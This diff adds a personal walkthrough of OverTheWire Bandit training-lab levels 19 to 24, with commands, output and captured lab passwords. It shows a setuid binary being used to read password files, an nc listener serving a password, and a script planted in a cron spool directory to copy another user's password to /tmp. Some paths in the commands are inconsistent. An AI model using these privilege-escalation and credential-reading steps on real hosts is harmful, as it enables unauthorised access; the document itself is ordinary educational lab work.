@@ -341,5 +341,178 @@ To gain access to the next level, you should use the setuid binary in the homedi
 
 ```
 ssh bandit19@bandit.labs.overthewire.org -p 2220
+file bandit20-do
+> setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8e941f24b8c5cd0af67b22b724c57e1ab92a92a1, not stripped
+
+./bandit20-do
+./bandit20-do cat /etc/bandit_pass/bandit20
+> GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 ```
 
+FLAG: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+The file bandit20-do allows us to do anything as Bandit20. I had to look this one up, and it turns out I actually mis-read the instructions. If I had understood the instructions correctly I might have got it.
+
+## Level 20
+
+There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).
+
+NOTE: Try connecting to your own network daemon to see if it works as you think
+
+Commands you may need to solve this level
+ssh, nc, cat, bash, screen, tmux, Unix ‘job control’ (bg, fg, jobs, &, CTRL-Z, …)
+
+```
+ssh bandit20@bandit.labs.overthewire.org -p 2220
+
+nmap localhost
+ls
+./suconnect 30000
+> [hangs]
+./suconnect 22
+Read: SSH-2.0-OpenSSH_7.4p1
+ERROR: This doesn't match the current password!
+
+echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -l localhost -p 5000 &
+
+./suconnect 8080
+```
+
+FLAG: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+I was really confused by this, I had to look it up and then I didn't understand the first 2 explanations I read. I think this challenge used to be slightly different in the past. In the end I had to create my own little server that would echo out the previous level's password, then hit it with the binary provided. That makes sense in retrospect but I still found this challenge weird.
+
+## Level 21
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+cron, crontab, crontab(5) (use “man 5 crontab” to access this)
+
+```
+ssh bandit21@bandit.labs.overthewire.org -p 2220
+
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit22
+>
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+
+cat /usr/bin/cron/cronjob_bandit22.sh
+#!/bin/bash
+>
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+> Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+```
+
+FLAG: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+`* * * * *` => At every minute
+
+`chmod 644`
+The owner will be able to read and save this file.
+The group will be able to read this file.
+Everyone will be able to read this file.
+
+(got this one without looking up the solution)
+
+## Level 22
+
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.
+
+```
+ssh bandit22@bandit.labs.overthewire.org -p 2220
+
+cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+cat /usr/bin/cronjob_bandit23.sh
+>
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+> 8ca319486bfbbc3663ea0fbe81326349
+
+cat tmp/8ca319486bfbbc3663ea0fbe81326349
+> jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+```
+
+FLAG: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+No help needed with this one!
+
+## Level 23
+
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+```
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+
+cat /etc/cron.d/cronjob_bandit24
+> * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+cat /usr/bin/cronjob_bandit24.sh
+>
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        timeout -s 9 60 ./$i
+        rm -f ./$i
+    fi
+done
+
+ls -la /var/spool/bandit24
+total 476
+drwxrwx--x 2 bandit24 bandit23 479232 Aug  5 18:20 .
+drwxr-xr-x 5 root     root       4096 Oct 16  2018 ..
+
+mkdir /tmp/mossy23
+touch /tmp/mossy23/script.sh
+vim /tmp/mossy23/script.sh
+> 
+#!/bin/sh
+cat /etc/bandit_pass/bandit24 > /tmp/mossy23/bandit24pass
+
+touch /tmp/mossy23/bandit24pass
+chmod 666 /tmp/mossy23/bandit24pass
+
+cp /tmp/mossy/script.sh /var/spool/bandit24
+[wait 1 minute]
+
+cat /tmp/mossy/bandit24pass
+> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+FLAG: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+`chmod 777` => owner,group,others. 7 = rwx
+
+Had to look this one up--I got stuck on a silent permissions error
+
+## Level 24
+
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+```
+```
